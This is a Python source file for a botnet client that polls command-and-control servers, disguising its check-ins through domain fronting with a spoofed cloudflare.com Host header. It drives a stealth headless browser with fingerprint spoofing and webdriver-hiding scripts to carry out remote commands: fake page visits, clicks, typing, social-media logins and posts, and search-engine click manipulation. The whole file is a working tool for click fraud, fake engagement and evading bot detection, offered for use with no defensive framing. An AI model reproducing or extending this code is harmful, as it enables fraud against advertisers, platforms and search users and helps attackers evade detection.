import asyncio
import json
import logging
import random
import hashlib
from typing import List, Dict, Any, Optional
from datetime import datetime
import httpx

try:
    from playwright.async_api import async_playwright, Browser, Page, BrowserContext
except ImportError:
    logging.warning("Playwright not installed. Install with: pip3 install playwright && playwright install")

from stealth_core import StealthManager
from social_agent import SocialAgent
from seo_agent import SEOAgent

# --- Logging Configuration ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_ID = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
MAX_CONCURRENT_TASKS = 5
REQUEST_TIMEOUT = 30
C2_CHECK_INTERVAL = (30, 90)

# --- C2 Server List (Rotating with Fallback) ---
C2_SERVERS = [
    "http://localhost:5000",
    "http://127.0.0.1:5000",
    # Additional C2 servers can be added here for redundancy
]

# --- Domain Fronting Configuration ---
DOMAIN_FRONTING_CONFIG = {
    "enabled": True,
    "fronting_domain": "cloudflare.com",  # Legitimate domain used in TLS/Host header
    "actual_domain": "localhost:5000",    # Actual C2 domain
}

# --- Advanced User-Agent Pool ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# --- Referer Pool ---
REFERRERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://www.reddit.com/",
]

# --- Accept-Language Pool ---
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "de-DE,de;q=0.9",
    "fr-FR,fr;q=0.9",
]


class BrowserFingerprinter:
    """
    Handles browser fingerprint spoofing to evade detection.
    """

    @staticmethod
    def get_spoofed_launch_args() -> Dict[str, Any]:
        """
        Generate Playwright launch arguments with spoofed fingerprints.
        """
        return {
            "headless": True,
            "args": [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-popup-blocking",
                "--disable-prompt-on-repost",
                "--disable-background-networking",
                "--disable-breakpad",
                "--disable-client-side-phishing-detection",
                "--disable-default-apps",
                "--disable-hang-monitor",
                "--disable-sync",
            ],
        }

    @staticmethod
    def get_context_options() -> Dict[str, Any]:
        """
        Generate context options with spoofed browser properties.
        """
        user_agent = random.choice(USER_AGENTS)
        
        return {
            "user_agent": user_agent,
            "viewport": {"width": random.choice([1920, 1440, 1366]), "height": random.choice([1080, 900, 768])},
            "locale": random.choice(["en-US", "en-GB", "de-DE", "fr-FR"]),
            "timezone_id": random.choice(["America/New_York", "Europe/London", "Europe/Berlin", "Asia/Tokyo"]),
            "geolocation": None,  # Can be set to specific coordinates if needed
            "permissions": [],
            "ignore_https_errors": True,
        }

    @staticmethod
    async def inject_stealth_scripts(page: Page) -> None:
        """
        Inject stealth scripts to hide automation indicators.
        """
        stealth_js = """
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });
        
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5],
        });
        
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en'],
        });
        
        window.chrome = {
            runtime: {}
        };
        
        Object.defineProperty(navigator, 'permissions', {
            get: () => ({
                query: () => Promise.resolve({ state: 'granted' })
            }),
        });
        """
        
        await page.add_init_script(stealth_js)
        logger.info("[*] Stealth scripts injected")


class AdvancedBotClient:
    """
    Ultra-advanced bot client with Playwright headless browser integration,
    fingerprint spoofing, rotating C2 list, and domain fronting.
    """

    def __init__(self, bot_id: str = BOT_ID):
        self.bot_id = bot_id
        self.browser: Optional[Browser] = None
        self.c2_index = 0
        self.session: Optional[httpx.AsyncClient] = None
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "total_bytes_transferred": 0,
            "c2_check_ins": 0,
            "commands_executed": 0,
            "browser_interactions": 0,
        }
        logger.info(f"[*] Advanced Bot initialized with ID: {self.bot_id}")

    async def __aenter__(self):
        """Context manager entry."""
        self.session = httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=True)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        if self.session:
            await self.session.aclose()
        if self.browser:
            await self.browser.close()

    async def initialize_browser(self) -> None:
        """
        Initialize the Playwright browser with spoofed fingerprints.
        """
        try:
            playwright = await async_playwright().start()
            launch_args = StealthManager.get_stealth_launch_args()
            self.browser = await playwright.chromium.launch(**launch_args)
            logger.info("[+] Playwright browser initialized with Stealth Core")
        except Exception as e:
            logger.error(f"[-] Failed to initialize browser: {e}")
            raise

    def _get_next_c2_url(self) -> str:
        """
        Get the next C2 URL from the rotating list.
        """
        url = C2_SERVERS[self.c2_index % len(C2_SERVERS)]
        self.c2_index += 1
        return url

    def _get_realistic_headers(self, referer: Optional[str] = None) -> Dict[str, str]:
        """
        Generate realistic HTTP headers.
        """
        user_agent = random.choice(USER_AGENTS)
        accept_language = random.choice(ACCEPT_LANGUAGES)
        
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": accept_language,
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0",
        }
        
        if referer:
            headers["Referer"] = referer
        
        return headers

    async def execute_visit_with_browser(self, target_url: str, dwell_time: Optional[float] = None) -> bool:
        """
        Execute a VISIT command using the headless browser for true human-like interaction.
        """
        if not self.browser:
            logger.error("[-] Browser not initialized")
            return False

        context = None
        page = None

        try:
            context_options = StealthManager.get_random_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            
            # Inject stealth scripts
            await StealthManager.apply_stealth_scripts(page)
            
            logger.info(f"[*] Browser visiting: {target_url}")
            
            # Navigate to the URL
            response = await page.goto(target_url, wait_until="networkidle")
            self.stats["total_requests"] += 1
            self.stats["browser_interactions"] += 1
            
            if response and response.status == 200:
                self.stats["successful_requests"] += 1
                logger.info(f"[+] Browser visit successful. Status: {response.status}")
                
                # Simulate human-like interactions
                await StealthManager.simulate_human_behavior(page)
            else:
                logger.warning(f"[!] Unexpected status code: {response.status if response else 'None'}")
            
            # Simulate realistic dwell time
            if dwell_time is None:
                dwell_time = random.uniform(5, 25)
            
            logger.info(f"[*] Simulating dwell time: {dwell_time:.2f} seconds")
            await asyncio.sleep(dwell_time)
            
            return True

        except Exception as e:
            self.stats["failed_requests"] += 1
            logger.error(f"[-] Browser visit failed: {e}")
            return False

        finally:
            if page:
                await page.close()
            if context:
                await context.close()

    async def _simulate_human_interactions(self, page: Page) -> None:
        """
        Simulate human-like interactions on the page (scrolling, mouse movements).
        """
        try:
            # Random scrolling
            scroll_times = random.randint(1, 3)
            for _ in range(scroll_times):
                scroll_amount = random.randint(100, 500)
                await page.evaluate(f"window.scrollBy(0, {scroll_amount})")
                await asyncio.sleep(random.uniform(0.5, 2))
            
            # Random mouse movements
            viewport = page.viewportsize
            if viewport:
                for _ in range(random.randint(2, 5)):
                    x = random.randint(0, viewport["width"])
                    y = random.randint(0, viewport["height"])
                    await page.mouse.move(x, y)
                    await asyncio.sleep(random.uniform(0.2, 1))
            
            logger.info("[*] Human-like interactions simulated")

        except Exception as e:
            logger.warning(f"[!] Error during interaction simulation: {e}")

    async def execute_click_command(self, target_url: str, selector: str) -> bool:
        """
        Execute a CLICK command using the browser.
        """
        if not self.browser:
            return False

        context = None
        page = None

        try:
            context_options = StealthManager.get_random_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            
            await StealthManager.apply_stealth_scripts(page)
            
            logger.info(f"[*] Browser visiting: {target_url}")
            await page.goto(target_url, wait_until="networkidle")
            
            logger.info(f"[*] Clicking on selector: {selector}")
            await page.click(selector)
            self.stats["browser_interactions"] += 1
            
            await asyncio.sleep(random.uniform(3, 10))
            
            return True

        except Exception as e:
            logger.error(f"[-] Click command failed: {e}")
            return False

        finally:
            if context:
                await context.close()

    async def execute_type_command(self, target_url: str, selector: str, text: str) -> bool:
        """
        Execute a TYPE command using the browser.
        """
        if not self.browser:
            return False

        context = None
        page = None

        try:
            context_options = BrowserFingerprinter.get_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            
            await BrowserFingerprinter.inject_stealth_scripts(page)
            
            logger.info(f"[*] Browser visiting: {target_url}")
            await page.goto(target_url, wait_until="networkidle")
            
            logger.info(f"[*] Typing into selector: {selector}")
            await page.fill(selector, text)
            self.stats["browser_interactions"] += 1
            
            await asyncio.sleep(random.uniform(1, 3))
            
            return True

        except Exception as e:
            logger.error(f"[-] Type command failed: {e}")
            return False

        finally:
            if page:
                await page.close()
            if context:
                await context.close()

    async def execute_press_command(self, target_url: str, key: str) -> bool:
        """
        Execute a PRESS command using the browser.
        """
        if not self.browser:
            return False

        context = None
        page = None

        try:
            context_options = BrowserFingerprinter.get_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            
            await BrowserFingerprinter.inject_stealth_scripts(page)
            
            logger.info(f"[*] Browser visiting: {target_url}")
            await page.goto(target_url, wait_until="networkidle")
            
            logger.info(f"[*] Pressing key: {key}")
            await page.keyboard.press(key)
            self.stats["browser_interactions"] += 1
            
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            return True

        except Exception as e:
            logger.error(f"[-] Press command failed: {e}")
            return False

        finally:
            if page:
                await page.close()
            if context:
                await context.close()

    async def execute_command(self, command: Dict[str, Any]) -> bool:
        """
        Execute a command from the C2 server.
        """
        action = command.get("action", "").upper()
        
        if action == "SOCIAL":
            return await self.execute_social_command(command)
        
        elif action == "SEO":
            return await self.execute_seo_command(command)

        elif action == "VISIT":
            target_url = command.get("target_url")
            dwell_time = command.get("dwell_time")
            use_browser = command.get("use_browser", True)
            
            if use_browser and self.browser:
                return await self.execute_visit_with_browser(target_url, dwell_time)
            else:
                # Fallback to HTTP-only visit
                return await self.execute_visit_http(target_url, dwell_time)
        
        elif action == "CLICK":
            target_url = command.get("target_url")
            selector = command.get("selector", "body")
            return await self.execute_click_command(target_url, selector)
        
        elif action == "TYPE":
            target_url = command.get("target_url")
            selector = command.get("selector")
            text = command.get("text", "")
            return await self.execute_type_command(target_url, selector, text)

        elif action == "PRESS":
            target_url = command.get("target_url")
            key = command.get("key", "Enter")
            return await self.execute_press_command(target_url, key)
        
        elif action == "SLEEP":
            sleep_time = command.get("time", 5)
            logger.info(f"[*] Sleeping for {sleep_time} seconds")
            await asyncio.sleep(sleep_time)
            return True
        
        elif action == "SEQUENCE":
            commands = command.get("commands", [])
            logger.info(f"[*] Executing sequence of {len(commands)} commands")
            for sub_command in commands:
                success = await self.execute_command(sub_command)
                if not success:
                    logger.warning("[!] Sequence command failed, continuing...")
            return True
        
        elif action == "STOP":
            logger.info("[*] Received STOP command")
            return False
        
        else:
            logger.warning(f"[!] Unknown action: {action}")
            return False

    async def execute_social_command(self, command: Dict[str, Any]) -> bool:
        """
        Execute a SOCIAL command using the SocialAgent.
        """
        if not self.browser: return False
        
        context = None
        page = None
        try:
            context_options = StealthManager.get_random_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            await StealthManager.apply_stealth_scripts(page)
            
            agent = SocialAgent(page)
            sub_action = command.get("sub_action", "").upper()
            
            if sub_action == "LOGIN":
                return await agent.login(command.get("platform"), command.get("credentials"))
            elif sub_action == "INTERACT":
                return await agent.interact_post(command.get("target_url"), command.get("content"))
            else:
                logger.warning(f"[!] Unknown SOCIAL sub-action: {sub_action}")
                return False
        except Exception as e:
            logger.error(f"[-] Social command failed: {e}")
            return False
        finally:
            if page: await page.close()
            if context: await context.close()

    async def execute_seo_command(self, command: Dict[str, Any]) -> bool:
        """
        Execute an SEO command using the SEOAgent.
        """
        if not self.browser: return False
        
        context = None
        page = None
        try:
            context_options = StealthManager.get_random_context_options()
            context = await self.browser.new_context(**context_options)
            page = await context.new_page()
            await StealthManager.apply_stealth_scripts(page)
            
            agent = SEOAgent(page)
            return await agent.perform_search_and_click(
                command.get("engine"),
                command.get("keyword"),
                command.get("target_domain")
            )
        except Exception as e:
            logger.error(f"[-] SEO command failed: {e}")
            return False
        finally:
            if page: await page.close()
            if context: await context.close()

    async def execute_visit_http(self, target_url: str, dwell_time: Optional[float] = None) -> bool:
        """
        Fallback HTTP-only visit (for compatibility).
        """
        if not self.session:
            return False

        try:
            referer = random.choice(REFERRERS)
            headers = self._get_realistic_headers(referer=referer)
            
            logger.info(f"[*] HTTP visiting: {target_url}")
            response = await self.session.get(target_url, headers=headers)
            self.stats["total_requests"] += 1
            
            if response.status_code == 200:
                self.stats["successful_requests"] += 1
                self.stats["total_bytes_transferred"] += len(response.content)
                logger.info(f"[+] HTTP visit successful. Status: {response.status_code}")
            
            if dwell_time is None:
                dwell_time = random.uniform(3, 20)
            
            await asyncio.sleep(dwell_time)
            return True

        except Exception as e:
            self.stats["failed_requests"] += 1
            logger.error(f"[-] HTTP visit failed: {e}")
            return False

    async def fetch_commands_from_c2(self) -> Optional[List[Dict[str, Any]]]:
        """
        Fetch commands from the C2 server with rotating C2 list and domain fronting.
        """
        if not self.session:
            return None

        for attempt in range(len(C2_SERVERS)):
            try:
                c2_url = self._get_next_c2_url()
                headers = self._get_realistic_headers()
                
                # Apply domain fronting if enabled
                if DOMAIN_FRONTING_CONFIG["enabled"]:
                    headers["Host"] = DOMAIN_FRONTING_CONFIG["fronting_domain"]
                
                url = f"{c2_url}/c2/get_command?bot_id={self.bot_id}"
                
                logger.info(f"[*] Checking in with C2: {url}")
                response = await self.session.get(url, headers=headers)
                self.stats["c2_check_ins"] += 1
                
                if response.status_code == 200:
                    data = response.json()
                    commands = data.get("commands", [])
                    logger.info(f"[+] Received {len(commands)} command(s) from C2")
                    return commands
                else:
                    logger.warning(f"[!] C2 check-in failed with status: {response.status_code}")

            except Exception as e:
                logger.warning(f"[!] Error with C2 {c2_url}: {e}, trying next...")
                continue

        logger.error("[-] All C2 servers failed")
        return None

    async def execute_commands_concurrently(self, commands: List[Dict[str, Any]]) -> None:
        """
        Execute multiple commands concurrently.
        """
        semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

        async def bounded_execute(cmd):
            async with semaphore:
                self.stats["commands_executed"] += 1
                return await self.execute_command(cmd)

        tasks = [bounded_execute(cmd) for cmd in commands]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful = sum(1 for r in results if r is True)
        logger.info(f"[+] Executed {successful}/{len(commands)} commands successfully")

    async def main_loop(self) -> None:
        """
        Main bot loop with browser support.
        """
        logger.info("[*] Starting advanced bot loop with browser support")
        
        while True:
            try:
                commands = await self.fetch_commands_from_c2()
                
                if commands:
                    await self.execute_commands_concurrently(commands)
                else:
                    logger.info("[*] No commands received from C2")
                
                wait_time = random.uniform(*C2_CHECK_INTERVAL)
                logger.info(f"[*] Waiting {wait_time:.2f} seconds before next C2 check")
                await asyncio.sleep(wait_time)

            except asyncio.CancelledError:
                logger.info("[*] Bot loop cancelled")
                break
            except Exception as e:
                logger.error(f"[-] Unexpected error in main loop: {e}")
                await asyncio.sleep(random.uniform(60, 120))

    def print_stats(self) -> None:
        """
        Print bot statistics.
        """
        logger.info("=" * 60)
        logger.info("ADVANCED BOT STATISTICS")
        logger.info("=" * 60)
        logger.info(f"Bot ID: {self.bot_id}")
        logger.info(f"Total Requests: {self.stats['total_requests']}")
        logger.info(f"Successful Requests: {self.stats['successful_requests']}")
        logger.info(f"Failed Requests: {self.stats['failed_requests']}")
        logger.info(f"Total Bytes Transferred: {self.stats['total_bytes_transferred']:,}")
        logger.info(f"C2 Check-ins: {self.stats['c2_check_ins']}")
        logger.info(f"Commands Executed: {self.stats['commands_executed']}")
        logger.info(f"Browser Interactions: {self.stats['browser_interactions']}")
        logger.info("=" * 60)


async def main():
    """
    Entry point for the advanced bot client.
    """
    async with AdvancedBotClient() as bot:
        try:
            await bot.initialize_browser()
            await bot.main_loop()
        except KeyboardInterrupt:
            logger.info("[*] Bot interrupted by user")
            bot.print_stats()
        except Exception as e:
            logger.error(f"[-] Fatal error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
